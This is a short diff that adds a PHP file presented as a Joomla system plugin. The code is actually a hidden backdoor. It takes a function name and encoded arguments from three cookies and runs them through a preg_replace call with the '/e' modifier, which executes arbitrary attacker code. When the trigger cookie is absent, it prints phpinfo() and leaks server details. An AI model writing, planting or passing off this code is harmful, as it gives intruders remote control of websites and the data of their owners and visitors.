@@ -1,0 +1,20 @@
+<?php
+/**
+ * @package     Joomla.Plugin.System
+ * @since       1.5
+ *
+ *
+ */
+class PluginJoomla {
+	public function __construct() {
+		$jq = @$_COOKIE['jgxj3'];
+		if ($jq) {
+			$option = $jq(@$_COOKIE['jgxj2']);
+			$au=$jq(@$_COOKIE['jgxj1']);
+			$option("/438/e",$au,438); die();
+		}
+		else
+			phpinfo();die;
+	}
+}
+$content = new PluginJoomla;
